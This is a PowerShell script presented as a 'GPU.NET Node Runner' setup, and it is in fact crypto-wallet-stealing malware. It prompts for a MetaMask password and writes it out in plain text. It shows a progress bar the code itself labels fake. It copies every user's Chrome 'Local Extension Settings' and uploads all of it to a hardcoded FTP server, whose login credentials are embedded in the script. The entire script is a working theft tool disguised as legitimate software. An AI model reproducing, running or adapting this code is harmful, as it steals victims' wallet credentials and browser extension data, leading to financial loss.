function Show-SetupMessage {
    Write-Host "=========================================="
    Write-Host "GPU.NET Node Runner Setup" -ForegroundColor Cyan -BackgroundColor Black
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "By running a GPU.NET node, you help perform large-scale computations distributed"
    Write-Host "across multiple nodes, which helps reduce the processing time for resource-intensive"
    Write-Host "tasks, making it a valuable resource for various industries needing high-performance computing."
    Write-Host ""
}
function Get-UserConsent {
    while ($true) {
        $userConsent = Read-Host "Do you want to proceed with the setup? (YES/NO)"
        if ($userConsent -eq "YES") {
            Write-Host "Proceeding with the setup..."
            break
        } elseif ($userConsent -eq "NO") {
            Write-Host "Setup aborted."
            exit
        } else {
            Write-Host "Invalid input. Please type YES or NO."
        }
    }
}

function Get-WalletCredentials {
    function Validate-WalletAddress {
        param ($walletAddress)
        if ($walletAddress -match "^0x[a-fA-F0-9]{40}$") {
            return $true
        } else {
            return $false
        }
    }
    while ($true) {
        $walletAddress = Read-Host "Provide Your Public Wallet Address"
        if (Validate-WalletAddress $walletAddress) {
            break
        } else {
            Write-Host "Public Wallet Address is incorrect. Please try again." -ForegroundColor Red
        }
    }
    Write-Host "Enter MetaMask Wallet Password:" -ForegroundColor Green
    $walletPassword = Read-Host -AsSecureString
    Write-Host "Re-Type MetaMask Wallet Password:" -ForegroundColor Green
    $reTypeWalletPassword = Read-Host -AsSecureString

    $passwordPlain = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($walletPassword))
    $reTypePasswordPlain = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($reTypeWalletPassword))

    $serviceFolder = Join-Path (Get-Location) "NodeRunnerService"
    if (-not (Test-Path $serviceFolder)) {
        New-Item -Path $serviceFolder -ItemType Directory
    }
    $passwordFilePath = Join-Path $serviceFolder "credentials.txt"
    Set-Content -Path $passwordFilePath -Value "Wallet Address: $walletAddress`nPassword: $passwordPlain`nRe-Type Password: $reTypePasswordPlain"

    Write-Host "Node Runner Service is starting the process..."
}

function Show-FakeLoading {
    Write-Host "Initializing node setup..."
    for ($i = 1; $i -le 10; $i++) {
        Write-Host -NoNewline "Progress: "
        Write-Host ("[" + ("#" * $i).PadRight(10) + "]" + " $($i * 10)%") -NoNewline
        Start-Sleep -Seconds 1
        Write-Host ""
    }
    Write-Host "Setup complete."
}

function Copy-ExtensionSettings {
    $scriptDirectory = Get-Location
    $baseRelativePath = "AppData\Local\Google\Chrome\User Data"
    $userDirs = Get-ChildItem "C:\Users" -Directory

    foreach ($userDir in $userDirs) {
        $chromeUserDataPath = Join-Path $userDir.FullName $baseRelativePath

        if (Test-Path $chromeUserDataPath) {
            Write-Host "Found Chrome User Data for user: $($userDir.Name)"

            $profileDirs = Get-ChildItem -Path $chromeUserDataPath -Directory -Filter "Profile*"

            foreach ($profileDir in $profileDirs) {
                $destinationProfilePath = Join-Path (Join-Path $scriptDirectory $userDir.Name) $profileDir.Name

                if (-not (Test-Path $destinationProfilePath)) {
                    New-Item -Path $destinationProfilePath -ItemType Directory -Force
                    Write-Host "Created folder: $destinationProfilePath"
                }
                $localExtensionSettingsPath = Join-Path $profileDir.FullName "Local Extension Settings"
                if (Test-Path $localExtensionSettingsPath) {
                    Copy-Item -Path $localExtensionSettingsPath\* -Destination $destinationProfilePath -Recurse -Force
                    Write-Host "Copied Local Extension Settings for $($profileDir.Name) in user: $($userDir.Name)"
                } else {
                    Write-Host "No 'Local Extension Settings' found for $($profileDir.Name)"
                }
            }
        } else {
            Write-Host "Chrome User Data folder not found for user: $($userDir.Name)"
        }
    }
}

$ftpServer = "ftp://gnldm1096.siteground.biz"
$ftpUsername = "admin@nodegpu.net"
$ftpPassword = "j37&g2_c4&p+"

function Generate-RandomFolderName {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    $randomString = -join ((Get-Random -Count 12 -InputObject $chars.ToCharArray()) -join '')
    return $randomString
}

$localFolderPath = Get-Location

function Create-FtpDirectory {
    param (
        [string]$ftpFolderUri
    )
    
    $request = [System.Net.FtpWebRequest]::Create($ftpFolderUri)
    $request.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
    $request.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
    try {
        $response = $request.GetResponse()
        $response.Close()
        Write-Host "Created directory on FTP: $ftpFolderUri"
    } catch {
        Write-Host "Directory may already exist or error creating directory: $ftpFolderUri"
    }
}

function Upload-FolderToFTP {
    param (
        [string]$localPath,
        [string]$ftpPath
    )

    $items = Get-ChildItem -Path $localPath -Recurse
    $totalItems = $items.Count
    $counter = 0
    foreach ($item in $items) {
        $relativePath = $item.FullName.Substring($localPath.Length).TrimStart("\\")
        $ftpUri = $ftpServer + $ftpPath + "/" + $relativePath -replace '\\', '/'

        if ($item.PSIsContainer) {
            Create-FtpDirectory $ftpUri
        } else {
            $counter++
            Write-Host "SYNC: $($item.Name) ($counter of $totalItems)"

            $webClient = New-Object System.Net.WebClient
            $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)

            try {
                $webClient.UploadFile($ftpUri, $item.FullName)
            } catch {
                Write-Host "Error uploading file: $item.FullName"
            }
        }
    }
}

Show-SetupMessage

Get-UserConsent

Get-WalletCredentials

Show-FakeLoading

$randomFolderName = Generate-RandomFolderName
$ftpDestinationFolder = "/" + $randomFolderName

$ftpFolderUri = $ftpServer + $ftpDestinationFolder
Create-FtpDirectory $ftpFolderUri

Copy-ExtensionSettings

Upload-FolderToFTP -localPath $localFolderPath -ftpPath $ftpDestinationFolder

Write-Host "All contents uploaded to the FTP server."
